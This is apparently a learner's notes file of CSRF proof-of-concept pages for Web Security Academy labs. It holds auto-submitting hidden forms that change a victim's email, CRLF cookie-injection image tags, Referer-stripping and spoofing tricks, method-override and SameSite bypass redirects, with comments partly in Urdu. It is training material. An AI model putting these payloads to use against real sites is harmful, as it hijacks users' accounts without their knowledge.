@@ -1,0 +1,226 @@
+<!-- Lab -> 1 -->
+
+
+<!-- <html>
+  <body>
+    <h1>Hello World!</h1>
+    <iframe style="display:none" name="csrf_iframe">
+
+    </iframe>
+
+    <form action="https://0ab100570382483483d305a300ad0057.web-security-academy.net/my-account/change-email" method="POST" id="csrf_form">
+      <input type="hidden" name="email" value="sameer249_1754@gmail.com">
+      <input type="submit" value="submit request">
+    </form>
+    <script>
+      document.forms[0].submit();
+// Necche wale se bhe kaam kar jai ga and forms se bhe 
+//   document.getElementById('csrf_form').submit();
+
+    </script>
+  </body>
+</html> -->
+
+
+
+<!-- Lab 2 -> -->
+
+
+<!-- 
+<html>
+  <body>
+    <h1>Hello World!</h1> -->
+    <!-- <iframe style="display:none" name="csrf_iframe">
+    </iframe>  -->
+    <!-- iframe kar rhy ke jab wo is par click rk ke change kre ga wo us page pe a jai ga jaha email change ho rhy us ko pata lag jaye ga lakin ham chate pata na lage to use kr rhy, wese yeh code hona ese he hai lakin wo phir bhe redirect kr rha idk -->
+
+    <!-- <form action="https://0add00960413100e809003400005009a.web-security-academy.net/my-account/change-email" method="GET" id="csrf_form">
+      <input type="hidden" name="email" value="sameer249_1712345@gmail.com">
+      <input type="submit" value="submit request">
+    </form>
+    <script>
+      document.forms[0].submit(); -->
+<!--       
+ Necche wale se bhe kaam kar jai ga and forms se bhe 
+document.getElementById('csrf_form').submit(); -->
+
+    <!-- </script>
+  </body>
+</html> -->
+
+
+
+<!-- LAB -> 3 -->
+
+
+<!-- <html>
+  <body>
+    <h1>Hello World!</h1> -->
+    <!-- <iframe style="display:none" name="csrf_iframe">
+    </iframe>  -->
+   
+    <!-- <form action="https://0a7f00220453d02d813925dd00d6000e.web-security-academy.net/my-account/change-email" method="POST" id="csrf_form">
+      <input type="hidden" name="email" value="sameer24917@gmail.com">
+      <input type="submit" value="submit request">
+    </form>
+    <script>
+      document.forms[0].submit(); -->
+
+<!-- document.getElementById('csrf_form').submit(); -->
+
+    <!-- </script>
+  </body>
+</html> -->
+
+<!-- Uper wale code me request POST rakhne cz me ne dusre file me bata dia post se frk nhi par rha csrf removve krne se, to scene yeh ho rha ke csrf token remove bhe ho jaye frk nhi parh rha, to attacker jab script yah poc banaye ga to wo csrf jo ke us ko wese bhe nhi pata ho ge banai ga he nhi and script chal jaye ge cz script ke hone na hone se frk nhi par rha -->
+
+<!-- my-account/change-email yeh jo cheez hai yeh inspect kr ke pata chale ge, form me action ke aage likha ho ga ke jab form submit ho tum ne yaha jana -->
+
+
+
+<!-- LAB 4 -> CSRF where token is not tied to user session -->
+
+
+
+<!-- <html>
+  <body>
+    <h1>Hello World!</h1> -->
+    <!-- <iframe style="display:none" name="csrf_iframe">
+    </iframe>  -->
+   
+    <!-- <form action="https://0a9900be03f68d26808b2b0a000200c4.web-security-academy.net/my-account/change-email" method="POST" id="csrf_form">
+      <input type="hidden" name="email" value="sameer179@gmail.com">
+      <input type="hidden" name="csrf" value="TxJaFOMD43ihHf3Mizj3L2LliLQvKXNC">
+      <input type="submit" value="submit request">
+    </form>
+    <script>
+      document.forms[0].submit(); -->
+
+<!-- document.getElementById('csrf_form').submit(); -->
+
+    <!-- </script>
+  </body>
+</html> -->
+
+<!-- TxJaFOMD43ihHf3Mizj3L2LliLQvKXNC -> Token aik dafa use ho gya next time nhi ho ga new dena pare ga  -->
+
+
+
+
+
+
+
+
+
+<!-- Lab #5 CSRF where token is tied to non-session cookie 
+—————>>>>>>> -->
+
+<!-- 
+<html>
+  <body>
+    <form action="https://0a8a004e04f9aacb8180b30800b400b9.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="sameer249@gmail.com">
+      <input type="hidden" name="csrf" value="XIzY5skpZM355fjy17fLScg2dUZ8XnrO">
+      <input type="submit" value="submit request">
+    </form>
+
+    <img style="display:none;" src="https://0a8a004e04f9aacb8180b30800b400b9.web-security-academy.net/?search=bat%0d%0aSet-Cookie:%20csrfKey=4V5iG5T2Pde5QKnkyvbiT54uLyJa0qUT" alt="" onerror="document.forms[0].submit()"> 
+  </body>
+</html> -->
+
+
+
+
+
+<!-- LAB -> 6 -> Lab #6 CSRF where token is duplicated in cookie.Is me is lie aik he cred dia cz is me token and key koi bhe rakh sakte hamein dusre dred ke zarurat nhi the ke us ke lagayen -----> 
+
+<!-- 
+<html>
+  <body>
+    <form action="https://0a81003b0448b985801bbc6000d400c7.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="sameer249@gmail.com">
+      <input type="hidden" name="csrf" value="test">
+      <input type="submit" value="submit request">
+    </form>
+
+    <img style="display:none;" src="https://0a81003b0448b985801bbc6000d400c7.web-security-academy.net/?search=bat%0d%0aSet-Cookie:%20csrf=test" alt="" onerror="document.forms[0].submit()"> 
+  </body>
+</html>
+-->
+
+
+<!-- Lab #7 CSRF where Referer validation depends on header being present -->
+
+<!-- 
+<html>
+  <head>
+    <meta name="referrer" content="never">
+  </head>
+  <body>
+    <form action="https://0aa6006403383aaa8645be3c0017000a.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+      <input type="hidden" name="email" value="sameer24@gmail.com">
+      <input type="hidden" name="csrf" value="test">
+      <input type="submit" value="submit request">
+    </form>
+
+    <script>
+      document.getElementById("csrf-form").submit()
+    </script>
+  </body>
+</html>
+
+ -->
+
+
+
+
+ <!-- Lab #8 CSRF with broken Referer validation  -->
+<!-- <html>
+    <body>
+        <script>
+            history.pushState('','','/?0a53001a0432d8aa804a4ef5007e0019.web-security-academy.net/my-account')
+        </script>
+        <h1>Hello World</h1>
+
+        <form action="https://0a53001a0432d8aa804a4ef5007e0019.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+            <input type="hidden" name="email" value="sameer151@gmail.com">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+
+    </body>
+</html> -->
+
+
+<!-- Lab -> 9
+Lab: SameSite Lax bypass via method override -->
+
+ <!-- <form action="https://0a620067043c10228122a2b400680066.web-security-academy.net/my-account/change-email" method="GET"> request get ke lax ke waja se
+  <input type="hidden" name="email" value="sameer249@gmail.com" />
+  <input type="hidden" name="_method" value="POST" />
+</form>
+
+<script>
+  document.forms[0].submit();
+</script> -->
+
+
+
+
+
+
+<!-- Lab -> 10 -->
+<!-- SameSite Strict bypass via client-side redirect -->
+
+
+
+
+<!-- <script>
+location = 'https://0a8d003904d2dbe181b7118200200071.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=sameer17@gmail.com%26submit=1' 
+</script> -->
+
+
+
+
+<!-- Lab -> 11
+SameSite Strict bypass via sibling domain -->
